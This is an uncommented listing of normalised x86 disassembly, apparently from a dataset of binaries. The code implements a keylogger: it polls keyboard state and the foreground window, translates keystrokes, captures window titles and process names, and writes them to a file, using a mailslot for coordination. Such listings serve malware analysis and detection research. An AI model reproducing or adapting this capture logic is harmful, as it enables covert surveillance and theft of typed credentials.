push eax
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x18
mov [ ebp - 0xa8 ] ecx
call sub_41ac18
add esp 0x4
mov [ ebp - 0xac ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor esi esi
mov ecx eax
call sub_412420
mov esi eax
jmp r-xdata
push ebx
push 0xffffffff
push ebx
push eax
call [ CreateMailslotW@IAT ]
cmp [ ebp - 0x3c ] 0x8
mov edi eax
mov [ ebp - 0xbc ] edi
jb r-xdata
mov eax [ eax ]
push 0xb
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_4124b0
push 0x62
push rw-data
mov ecx esi
call sub_412490
lea eax [ ebp - 0x50 ]
push eax
mov ecx esi
call sub_412790
cmp [ eax + 0x14 ] 0x8
jb r-xdata
xor edx edx
mov eax 0x7
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x50 ] dx
cmp edi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x50 ]
push ecx
call sub_41a0d6
add esp 0x4
mov ecx [ rw-data ]
push ecx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0xac ] esp
push ebx
xor edx edx
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x10 ] ebx
push r--data
mov [ ecx ] dx
call sub_403650
mov edi [ ebp - 0xa8 ]
mov ecx [ edi + 0x18 ]
mov eax [ ecx ]
mov edx [ eax ]
call edx
cmp eax ebx
je r-xdata
cmp esi ebx
je r-xdata
push 0x2
push 0x104
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0xb0 ] ebx
call sub_41acef
add esp 0x8
push 0x7
push rw-data
mov ecx esi
mov [ ebp - 0xac ] eax
call sub_412490
xor eax eax
mov [ ebp - 0x17 ] eax
mov [ ebp - 0x13 ] ax
lea eax [ ebp - 0xa4 ]
push eax
mov ecx esi
mov [ ebp - 0x18 ] bl
call sub_412890
mov edi eax
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_412890
mov ecx [ edi + 0x10 ]
mov edi 0x10
cmp [ eax + 0x14 ] edi
jb r-xdata
mov ecx edi
call sub_40a5b0
push ebx
mov ecx edi
call sub_40de30
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_412460
push esi
call sub_41a0d6
add esp 0x4
push ecx
push eax
lea edx [ ebp - 0x18 ]
push edx
call sub_41a0f0
add esp 0xc
cmp [ ebp - 0x20 ] edi
jb r-xdata
mov eax [ eax ]
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x34 ] bl
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x90 ] edi
jb r-xdata
mov eax [ ebp - 0x34 ]
push eax
call sub_41a0d6
add esp 0x4
push 0xb
push rw-data
mov ecx esi
call sub_4124b0
push 0xe
push rw-data
mov ecx esi
call sub_412490
xor eax eax
lea edx [ ebp - 0x88 ]
push edx
mov ecx esi
mov [ ebp - 0x28 ] bl
mov [ ebp - 0x27 ] eax
mov [ ebp - 0x23 ] eax
mov [ ebp - 0x1f ] eax
mov [ ebp - 0x1b ] al
call sub_412890
mov edi eax
lea eax [ ebp - 0x6c ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_412890
mov ecx [ edi + 0x10 ]
mov edi 0x10
cmp [ eax + 0x14 ] edi
jb r-xdata
mov ecx [ ebp - 0xa4 ]
push ecx
call sub_41a0d6
add esp 0x4
push ecx
push eax
lea ecx [ ebp - 0x28 ]
push ecx
call sub_41a0f0
add esp 0xc
cmp [ ebp - 0x58 ] edi
jb r-xdata
mov eax [ eax ]
mov [ ebp - 0x58 ] 0xf
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x6c ] bl
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x74 ] edi
jb r-xdata
mov edx [ ebp - 0x6c ]
push edx
call sub_41a0d6
add esp 0x4
mov [ ebp - 0x74 ] 0xf
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x88 ] bl
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x88 ]
push eax
call sub_41a0d6
add esp 0x4
mov esi [ Sleep@IAT ]
push 0x14
call esi
mov edi [ ebp - 0xbc ]
push ebx
lea ecx [ ebp - 0xb4 ]
push ecx
lea edx [ ebp - 0xb8 ]
push edx
push ebx
push edi
call [ GetMailslotInfo@IAT ]
cmp [ ebp - 0xb4 ] ebx
je r-xdata
mov ecx esi
call sub_412460
push esi
call sub_41a0d6
add esp 0x4
lea esp [ esp ]
push 0x14
call esi
mov ecx [ ebp - 0xa8 ]
call sub_40e800
jmp r-xdata
mov esi [ ebp - 0xac ]
push 0x104
push ebx
push esi
call sub_41adb0
mov ecx [ ebp - 0xb8 ]
add esp 0xc
push ebx
lea eax [ ebp - 0xb0 ]
push eax
push ecx
push esi
push edi
mov [ ebp - 0xb0 ] ebx
call [ ReadFile@IAT ]
lea eax [ ebp - 0x18 ]
lea edx [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea edx [ ebp - 0x18 ]
push edx
push esi
call sub_41b154
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0xb0 ]
push eax
push esi
mov esi [ ebp - 0xa8 ]
mov ecx esi
call sub_40d6f0
lea eax [ ebp - 0x28 ]
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0xa8 ]
push 0xffffffff
call sub_40de30
mov ecx [ ebp - 0xa8 ]
call sub_40e800
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x28 ]
push ecx
mov ecx esi
call sub_40d6f0
mov ecx [ ebp - 0xa8 ]
call sub_40e800
jmp r-xdata
sub_40f440
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
cmp eax [ esi + 0x20 ]
jbe r-xdata
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop esi
jmp sub_40e6e0
xor eax eax
pop esi
retn
call sub_40e6e0
mov [ esi + 0x28 ] 0x0
pop esi
retn
sub_40f470
push ebp
mov ebp esp
push 0xffffffff
push sub_42e058
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
add ecx 0x3c
call sub_407be0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_40f550
push ebp
mov ebp esp
push 0xffffffff
push sub_42e0e3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
xor ebx ebx
xor eax eax
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x3c ] esi
mov [ esi + 0x4 ] ax
lea ecx [ esi + 0x8 ]
mov [ ebp - 0x4 ] ebx
mov [ esi ] r--data
call sub_409f20
push 0xc
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0x34 ] ebx
call sub_41ac18
add esp 0x4
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x34 ]
push ecx
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x34 ] ebx
call sub_419f97
push r--data
lea edx [ ebp - 0x48 ]
push edx
mov [ ebp - 0x48 ] r--data
call sub_41ac98
int3
mov [ esi + 0x30 ] eax
mov [ eax ] eax
mov eax [ esi + 0x30 ]
mov [ eax + 0x4 ] eax
lea edi [ esi + 0x3c ]
push 0x8
mov [ ebp - 0x4 ] 0x2
mov [ edi ] ebx
call sub_41ac18
add esp 0x4
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x30 ]
push edx
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x30 ] ebx
call sub_419f97
push r--data
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x54 ] r--data
call sub_41ac98
mov [ edi ] eax
mov [ eax + 0x4 ] ebx
xor ecx ecx
mov [ eax ] ecx
mov ecx [ edi ]
mov [ ecx ] edi
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
lea ecx [ esi + 0x54 ]
mov [ ebp - 0x4 ] 0x3
call sub_419dd7
lea ecx [ esi + 0x8 ]
mov [ ebp - 0x4 ] 0x4
mov [ esi + 0x1c ] ebx
call sub_409bc0
mov edx [ rw-data ]
push 0x18
mov [ esi + 0x58 ] eax
mov [ esi + 0x20 ] edx
call sub_41ac18
add esp 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x5
cmp eax ebx
je r-xdata
mov [ ebp - 0x30 ] ebx
push 0xb
push rw-data
push 0x3e
push rw-data
mov ecx eax
call sub_412430
mov [ ebp - 0x30 ] eax
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0x30 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_412790
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x38 ] 0x1
jb r-xdata
push 0x64
mov [ ebp - 0x4 ] 0x4
call sub_41ac18
mov edi eax
add esp 0x4
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x4 ] 0x6
cmp edi ebx
je r-xdata
mov edi [ ebp - 0x30 ]
cmp edi ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
mov cx [ rw-data ]
mov [ esi + 0x24 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x4 ] cx
mov [ esi + 0x28 ] bl
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn
mov ecx edi
call sub_412460
push edi
call sub_41a0d6
add esp 0x4
mov eax [ ebp - 0x2c ]
push eax
call sub_41a0d6
add esp 0x4
test [ ebp - 0x38 ] 0x1
mov [ esi + 0x18 ] eax
mov [ ebp - 0x4 ] 0x4
je r-xdata
mov edx [ rw-data ]
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ rw-data ]
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
mov [ eax + 0x8 ] edx
mov edx [ rw-data ]
push ecx
push ebx
mov ecx edi
mov [ eax + 0xc ] edx
call sub_418590
jmp r-xdata
sub_40f780
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40efa0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41a0d6
add esp 0x4
sub_40f7b0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
movzx ecx [ esi ]
xor edx edx
xor eax eax
test cx cx
je r-xdata
pop esi
pop ebp
retn 0x4
movzx ecx cx
ror eax 0xd
inc edx
add eax ecx
movzx ecx [ esi + edx * 2 ]
test cx cx
jne r-xdata
sub_40f7e0
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x4 ]
call sub_419e08
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
mov [ esi + 0x2c ] ecx
cmp ecx eax
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_419e11
pop edi
xor al al
pop esi
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov edi edi
lea ecx [ esi + 0x4 ]
call sub_419e11
pop edi
mov al 0x1
pop esi
pop ebp
retn 0x4
mov ecx [ ecx ]
mov [ esi + 0x2c ] ecx
cmp ecx [ esi + 0x20 ]
jne r-xdata
mov ecx [ esi + 0x2c ]
cmp [ ecx + 0x8 ] eax
je r-xdata
sub_40f840
push esi
mov esi ecx
cmp [ esi + 0x18 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] eax
mov [ esi + 0x4 ] al
pop esi
retn
mov eax [ esi + 0x4 ]
push eax
call sub_41a0d6
add esp 0x4
sub_40f870
push ebp
mov ebp esp
push 0xffffffff
push sub_42e13e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xfc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x18
mov esi ecx
mov [ ebp - 0xfc ] ebx
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xa4 ] ebx
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0xd8 ] ebx
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xf0 ] ebx
mov [ ebp - 0xec ] ebx
mov [ ebp - 0xf8 ] ebx
mov [ ebp - 0x9e ] bl
mov [ ebp - 0x9d ] bl
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xf4 ] ebx
mov [ ebp - 0xd4 ] ebx
mov [ ebp - 0x108 ] ebx
mov [ ebp - 0x104 ] ebx
mov [ ebp - 0xe4 ] ebx
mov [ ebp - 0xe0 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0xdc ] ebx
call sub_41ac18
add esp 0x4
mov [ ebp - 0xc0 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor edi edi
mov ecx eax
call sub_412420
mov edi eax
jmp r-xdata
mov edx [ esi + 0x8 ]
add ecx ecx
push ecx
push eax
push edx
call sub_41a0f0
add esp 0xc
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
mov eax [ eax ]
push 0xb
push rw-data
mov ecx edi
mov [ ebp - 0x4 ] 0xffffffff
call sub_4124b0
push 0x3c
push rw-data
mov ecx edi
call sub_412490
lea eax [ ebp - 0x2c ]
push eax
mov ecx edi
call sub_412790
mov [ ebp - 0xb0 ] eax
lea ecx [ ebp - 0x48 ]
push ecx
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_412790
cmp [ eax + 0x14 ] 0x8
mov edx [ ebp - 0xb0 ]
mov ecx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] cx
mov [ ebp - 0x4 ] 0xffffffff
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_41a0d6
add esp 0x4
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
call sub_412790
cmp [ ebp - 0x34 ] 0x8
mov ecx [ eax + 0x10 ]
mov [ ebp - 0xb8 ] ecx
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_41a0d6
add esp 0x4
push 0x2c
xor eax eax
push rw-data
mov ecx edi
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] ax
call sub_412490
lea ecx [ ebp - 0x64 ]
push ecx
mov ecx edi
call sub_412790
mov [ ebp - 0xb0 ] eax
lea edx [ ebp - 0x2c ]
push edx
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call sub_412790
cmp [ eax + 0x14 ] 0x8
mov ecx [ ebp - 0xb0 ]
mov ecx [ ecx + 0x10 ]
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_41a0d6
add esp 0x4
lea edx [ ecx + ecx ]
push edx
push eax
mov eax [ esi + 0x10 ]
push eax
call sub_41a0f0
add esp 0xc
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ eax ]
xor edx edx
cmp [ ebp - 0x50 ] 0x8
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] dx
mov [ ebp - 0x4 ] 0xffffffff
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
lea ecx [ ebp - 0x64 ]
push ecx
mov ecx edi
call sub_412790
cmp [ ebp - 0x50 ] 0x8
mov edx [ eax + 0x10 ]
mov [ ebp - 0xcc ] edx
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_41a0d6
add esp 0x4
push 0x30
push rw-data
mov ecx edi
call sub_412490
lea ecx [ ebp - 0x64 ]
push ecx
mov ecx edi
call sub_412790
mov [ ebp - 0xb0 ] eax
lea edx [ ebp - 0x2c ]
push edx
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call sub_412790
cmp [ eax + 0x14 ] 0x8
mov ecx [ ebp - 0xb0 ]
mov ecx [ ecx + 0x10 ]
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_41a0d6
add esp 0x4
lea edx [ ecx + ecx ]
push edx
push eax
mov eax [ esi + 0xc ]
push eax
call sub_41a0f0
add esp 0xc
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ eax ]
xor edx edx
cmp [ ebp - 0x50 ] 0x8
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] dx
mov [ ebp - 0x4 ] 0xffffffff
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx edi
call sub_412790
cmp [ ebp - 0x18 ] 0x8
mov edx [ eax + 0x10 ]
mov [ ebp - 0xd0 ] edx
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_41a0d6
add esp 0x4
xor ecx ecx
push 0x62
mov [ ebp - 0x2c ] cx
push rw-data
mov ecx edi
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
call sub_412490
lea edx [ ebp - 0x9c ]
push edx
mov ecx edi
call sub_412790
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_41a0d6
add esp 0x4
push ebx
push 0x80
push 0x3
push ebx
push 0x3
push 0x40000000
push eax
call [ CreateFileW@IAT ]
cmp [ ebp - 0x88 ] 0x8
mov [ ebp - 0xac ] eax
jb r-xdata
mov eax [ eax ]
xor ecx ecx
push 0x7
mov [ ebp - 0x9c ] cx
push rw-data
mov ecx edi
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] ebx
call sub_412490
lea edx [ ebp - 0x80 ]
push edx
mov ecx edi
call sub_412890
mov [ ebp - 0x4 ] 0x4
cmp edi ebx
je r-xdata
mov eax [ ebp - 0x9c ]
push eax
call sub_41a0d6
add esp 0x4
cmp [ ebp - 0xac ] ebx
jne r-xdata
mov ecx edi
call sub_412460
push edi
call sub_41a0d6
add esp 0x4
call [ GetCurrentThreadId@IAT ]
mov [ ebp - 0xb0 ] eax
jmp r-xdata
cmp [ ebp - 0x6c ] 0x10
jb r-xdata
mov edi [ Sleep@IAT ]
push 0x14
call edi
cmp [ ebp - 0xd8 ] 0x0
je r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x80 ]
push eax
call sub_41a0d6
add esp 0x4
call [ GetForegroundWindow@IAT ]
mov ebx eax
mov [ ebp - 0xc4 ] ebx
test ebx ebx
jne r-xdata
cmp [ ebp - 0xa8 ] 0x0
jne r-xdata
cmp ebx [ ebp - 0xf4 ]
je r-xdata
push 0x12c
call edi
jmp r-xdata
cmp [ ebp - 0xf8 ] 0x64
jae r-xdata
cmp [ ebp - 0xa8 ] 0x0
je r-xdata
lea ecx [ ebp - 0xfc ]
push ecx
push ebx
call [ GetWindowThreadProcessId@IAT ]
mov edi eax
mov [ ebp - 0x9e ] 0x0
cmp edi [ ebp - 0xa8 ]
je r-xdata
call [ GetTickCount@IAT ]
mov [ ebp - 0xc0 ] eax
sub eax [ ebp - 0xf0 ]
cmp eax 0x1f4
jbe r-xdata
mov eax [ esi + 0x18 ]
push eax
call [ GetKeyboardState@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0xa8 ] 0x0
je r-xdata
lea ecx [ ebp - 0x108 ]
push ecx
call [ GetCursorPos@IAT ]
test eax eax
je r-xdata
xor edi edi
lea ebx [ ebx ]
push 0x1f4
call [ Sleep@IAT ]
mov edx [ ebp - 0xb0 ]
push 0x1
push edx
push edi
call [ AttachThreadInput@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0xb0 ]
mov eax [ ebp - 0xa8 ]
push 0x0
push edx
push eax
call [ AttachThreadInput@IAT ]
mov ecx [ esi + 0x1c ]
push 0x100
push 0x0
push ecx
call sub_41adb0
add esp 0xc
mov [ ebp - 0xa8 ] 0x0
mov ebx [ ebp - 0x108 ]
mov edi [ ebp - 0x104 ]
mov ecx ebx
sub ecx [ ebp - 0xe4 ]
mov eax edi
sub eax [ ebp - 0xe0 ]
mov edx ecx
imul edx ecx
imul eax eax
add edx eax
mov [ ebp - 0xf8 ] edx
je r-xdata
inc edi
cmp edi 0x100
jb r-xdata
mov [ eax + edi ] cl
mov edx [ esi + 0x18 ]
test [ edi + edx ] 0x80
jne r-xdata
push 0x64
call [ Sleep@IAT ]
mov [ ebp - 0xa8 ] edi
mov edi [ ebp - 0xa4 ]
mov [ ebp - 0xf4 ] ebx
mov [ ebp - 0xd8 ] 0x1
test edi edi
je r-xdata
push edi
push ebx
mov [ ebp - 0xe4 ] ebx
mov [ ebp - 0xe0 ] edi
call [ WindowFromPoint@IAT ]
mov edi eax
test edi edi
je r-xdata
mov edx [ esi + 0x18 ]
mov eax [ esi + 0x1c ]
mov cl [ edi + edx ]
cmp cl [ eax + edi ]
je r-xdata
jmp r-xdata
mov [ ebp - 0x9f ] 0x0
cmp edi 0x8
je r-xdata
mov eax [ ebp - 0xfc ]
cmp eax [ ebp - 0x100 ]
je r-xdata
cmp [ ebp - 0x9d ] 0x0
jne r-xdata
cmp edi [ ebp - 0xd4 ]
jne r-xdata
cmp edi 0x1b
je r-xdata
cmp edi 0xb
je r-xdata
push eax
push 0x0
push 0x410
mov [ ebp - 0x100 ] eax
call [ OpenProcess@IAT ]
mov edi eax
call [ GetLastError@IAT ]
test edi edi
je r-xdata
mov ecx [ esi + 0x14 ]
mov edx [ ebp - 0xcc ]
mov eax [ esi + 0x10 ]
push 0x0
push 0x0
push 0x230
push ecx
add edx edi
push edx
push eax
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov edx [ esi + 0x14 ]
push 0x0
lea ecx [ ebp - 0xb4 ]
push ecx
push eax
mov eax [ ebp - 0xac ]
push edx
push eax
call [ WriteFile@IAT ]
mov [ ebp - 0xa4 ] 0x0
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0xb8 ]
add edx [ ebp - 0xc8 ]
push 0x0
push 0x0
push 0x230
push eax
mov eax [ esi + 0x8 ]
push edx
push eax
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov edx [ esi + 0x14 ]
push 0x0
lea ecx [ ebp - 0xb4 ]
push ecx
push eax
mov eax [ ebp - 0xac ]
push edx
push eax
call [ WriteFile@IAT ]
mov [ ebp - 0x9d ] 0x1
push 0x0
push edi
call [ GetWindowThreadProcessId@IAT ]
cmp eax [ ebp - 0xa8 ]
je r-xdata
mov eax [ ebp - 0xc0 ]
mov edx eax
sub edx [ ebp - 0xe8 ]
cmp edx 0x1f4
jb r-xdata
cmp [ ebp - 0xa4 ] 0x0
je r-xdata
cmp edi 0x20
jbe r-xdata
cmp edi 0xd
jbe r-xdata
mov ebx [ ebp - 0xb8 ]
mov ecx [ esi + 0x8 ]
add ebx ebx
push 0x104
add ecx ebx
push ecx
push edi
call GetProcessImageFileNameW
mov [ ebp - 0xc8 ] eax
test eax eax
je r-xdata
cmp edi [ ebp - 0xc4 ]
je r-xdata
mov [ ebp - 0xd8 ] 0x0
jmp r-xdata
mov edi [ ebp - 0xc4 ]
mov [ ebp - 0xe8 ] eax
cmp edi [ ebp - 0xd4 ]
je r-xdata
cmp [ ebp - 0xa4 ] 0x5
jbe r-xdata
mov ebx [ ebp - 0xa4 ]
jmp r-xdata
cmp edi 0x2a
jbe r-xdata
cmp edi 0x2a
jb r-xdata
push edi
call [ CloseHandle@IAT ]
mov edx [ esi + 0x8 ]
add edx ebx
push edx
call [ PathFindFileNameW@IAT ]
push eax
mov ecx esi
call sub_40f7b0
push eax
mov ecx esi
call sub_40f7e0
cmp al 0x1
jne r-xdata
mov ebx [ ebp - 0xd0 ]
mov ecx [ esi + 0xc ]
lea eax [ ebp - 0xbc ]
push eax
push 0xa
push 0x3
add ebx ebx
add ecx ebx
push ecx
push 0x104
push 0xd
push edi
call [ SendMessageTimeoutW@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0xd4 ] edi
cmp edi 0x2
jbe r-xdata
cmp [ ebp - 0x9e ] 0x1
jne r-xdata
cmp [ ebp - 0x9d ] 0x0
jne r-xdata
mov eax [ ebp - 0xa8 ]
push eax
call [ GetKeyboardLayout@IAT ]
mov ebx eax
push ebx
push 0x0
push edi
call [ MapVirtualKeyExW@IAT ]
test eax eax
je r-xdata
cmp edi 0x30
jb r-xdata
mov [ ebp - 0x9d ] 0x0
mov [ ebp - 0x9e ] al
cmp [ ebp - 0xbc ] 0x0
je r-xdata
call [ GetTickCount@IAT ]
mov [ ebp - 0xf0 ] eax
cmp [ ebp - 0x6c ] 0x10
mov eax [ ebp - 0x80 ]
mov [ ebp - 0x9e ] 0x0
jae r-xdata
mov ecx [ esi + 0x14 ]
mov edx [ ebp - 0xcc ]
mov eax [ esi + 0x10 ]
push 0x0
push 0x0
push 0x230
push ecx
add edx ebx
push edx
push eax
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov edx [ esi + 0x14 ]
push 0x0
lea ecx [ ebp - 0xb4 ]
push ecx
push eax
mov eax [ ebp - 0xac ]
push edx
push eax
call [ WriteFile@IAT ]
mov [ ebp - 0xa4 ] 0x0
jmp r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0xb8 ]
add eax [ ebp - 0xc8 ]
push 0x0
push 0x0
push 0x230
push edx
mov edx [ esi + 0x8 ]
push eax
push edx
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov edx [ esi + 0x14 ]
push 0x0
lea ecx [ ebp - 0xb4 ]
push ecx
push eax
mov eax [ ebp - 0xac ]
push edx
push eax
call [ WriteFile@IAT ]
mov [ ebp - 0x9d ] 0x1
mov edx [ esi + 0x18 ]
push ebx
push 0x0
push 0x2
lea ecx [ ebp - 0xdc ]
push ecx
push edx
push eax
push edi
call [ ToUnicodeEx@IAT ]
cmp eax 0x1
jne r-xdata
mov edx [ esi + 0xc ]
lea eax [ ebx + edx ]
lea ecx [ eax + 0x2 ]
mov [ ebp - 0xc0 ] ecx
mov edx [ ebp - 0x70 ]
push 0x0
lea ecx [ ebp - 0xb4 ]
push ecx
push edx
push eax
mov eax [ ebp - 0xac ]
push eax
call [ WriteFile@IAT ]
lea eax [ ebp - 0x80 ]
mov eax [ ebp - 0xdc ]
mov ebx [ ebp - 0xa4 ]
cmp ax 0x1f
jbe r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp - 0xc0 ]
mov ecx [ ebp - 0xbc ]
sar eax 0x1
cmp ecx eax
jne r-xdata
cmp [ ebp - 0xdc ] 0x8
jne r-xdata
mov ecx [ ebp - 0xcc ]
mov edx [ esi + 0x10 ]
add ecx ebx
mov [ edx + ecx * 2 ] ax
movzx eax [ esi ]
inc ebx
mov [ ebp - 0xa4 ] ebx
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0xd0 ]
add eax ecx
xor ecx ecx
mov [ edx + eax * 2 + 0x2 ] cx
cmp edi [ ebp - 0xc4 ]
jne r-xdata
cmp [ ebp - 0x9f ] 0x0
je r-xdata
